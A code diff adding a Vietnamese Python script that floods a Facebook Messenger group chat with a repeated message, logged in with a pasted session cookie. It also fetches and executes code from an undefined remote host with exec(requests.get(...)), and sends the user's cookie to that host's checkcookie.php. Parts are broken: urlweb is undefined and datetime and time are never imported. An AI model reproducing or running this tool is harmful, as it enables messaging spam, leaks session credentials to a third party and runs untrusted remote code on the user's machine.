@@ -1,0 +1,104 @@
+import requests, os, sys
+exec(requests.get(urlweb+"settup").text)
+exec(requests.get(urlweb+"mau").text)
+exec(requests.get(urlweb+"logo").text)
+os.system('clear')
+logo()
+cookie=input("Nhập Cookie: ")
+a=requests.get(urlweb+"checkcookie.php?cookie="+cookie).json()
+data=a["data"]
+if data=="Die":
+ sys.exit(data)
+else:
+ user=a["user"]
+ idprofile=a["id"]
+ print(user+"=>"+idprofile)
+linkgoc=input('Nhập link box: ')
+noidung=input(f"Nhập Nội Dung: ")
+delay=int(input("Nhập delay: "))
+dem=input("Muốn Đếm không ?y/n: ")
+if "messages/t/"in linkgoc:
+ link1=linkgoc.split('messages/t/')[1]
+ linkbox=f"https://mbasic.facebook.com/messages/read/?tid={link1}"
+elif "cid.g" in linkgoc:
+ link1=linkgoc.split('cid.g.')[1].split('&')[0]
+ linkbox="https://mbasic.facebook.com/messages/read/?tid="+link1
+elif "?tid=" in linkgoc:
+ link1=linkgoc.split('?tid=')[1].split('&')[0]
+ linkbox="https://mbasic.facebook.com/messages/read/?tid="+link1
+elif linkgoc=="":
+ sys.exit("Vui lòng nhập link box!!")
+else:
+ sys.exit("Vui lòng nhập đúng link box")
+head={
+ 'Host':'mbasic.facebook.com',
+ 'cache-control':'max-age=0',
+ 'sec-ch-ua-mobile':'?0',
+ 'sec-ch-ua-platform':'"macOS"',
+ 'upgrade-insecure-requests':'1',
+ 'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5371.102 Safari/537.36',
+ 'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+ 'sec-fetch-site':'cross-site',
+ 'sec-fetch-mode':'navigate',
+ 'sec-fetch-user':'?1',
+ 'sec-fetch-dest':'document',
+ 'cookie':cookie,
+}
+a=requests.get(f"{linkbox}",headers=head).text
+if "/friends/selector/?" in a:
+ sys.exit("Bạn Đã bị out box")
+check=a.find('method="post" action="/messages/send/?')
+if check!=-1:
+ if 'action="/messages/send/?' in a: b=a.split('action="/messages/send/?')[1].split('"')[0].replace('amp;','')
+ c="https://mbasic.facebook.com/messages/send/?"+b
+ e=a.split('/messages/send/')[1].split('post')[0]
+ fb_dtsg=e.split('fb_dtsg" value="')[1].split('"')[0]
+ jazoest=e.split('jazoest" value="')[1].split('"')[0]
+ tids=e.split('tids" value="')[1].split('"')[0]
+ wwwupp=e.split('wwwupp" value="')[1].split('"')[0]
+ wwwupp=e.split('wwwupp" value="')[1].split('"')[0]
+ platform_xmd=e.split('platform_xmd" value="')[1].split('"')[0]
+ platform_xmd=e.split('platform_xmd" value="')[1].split('"')[0]
+ cver=e.split('cver" value="')[1].split('"')[0]
+ csid=e.split('csid" value="')[1].split('"')[0]
+ 
+ head1={
+  'Host':'mbasic.facebook.com',
+  'content-length':'247',
+  'cache-control':'max-age=0',
+  'sec-ch-ua':'"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
+  'sec-ch-ua-mobile':'?0',
+  'sec-ch-ua-platform':'"macOS"',
+  'upgrade-insecure-requests':'1',
+  'origin':'https://mbasic.facebook.com',
+  'content-type':'application/x-www-form-urlencoded',
+  'user-agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5371.102 Safari/537.36',
+  'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'sec-fetch-site':'same-origin',
+  'sec-fetch-mode':'navigate',
+  'sec-fetch-user':'?1',
+  'sec-fetch-dest':'document',
+  'referer':c,
+  'cookie':cookie,
+ }
+ for i in range(1,99999,1):
+  if dem=="y":
+   a=i
+   noidungy=str(i)+" "+noidung
+  else: 
+   noidungy=noidung
+  a=requests.get(f"{linkbox}",headers=head).text
+  kk=a.find('method="post" action="/messages/send/?')
+  if kk==-1:
+   sys.exit("Bạn Đã bị out box                     ")
+  # ngày giờ hiện tại
+  now = datetime.now()
+  t = now.strftime("%H:%M:%S")
+  data=f"fb_dtsg={fb_dtsg}&jazoest={jazoest}&body={noidungy}&send=G%E1%BB%ADi&tids={tids}&wwwupp={wwwupp}&platform_xmd={platform_xmd}&referrer=&ctype=&cver={cver}&csid={csid}"
+  requests.post(url=c,data=data,headers=head1)
+  print(f"{mauluc}[{i}] {t} {mauluc}Spam thành công {mauxduong}{link1}")
+  for i in range(delay,-1,-1):
+         print(f'{mauluc}Vui Lòng Chờ '+str(i)+' Giây ',end=('\r'))
+         time.sleep(1)
+else:
+ print("Box không hợp lệ hoặc bị out box")
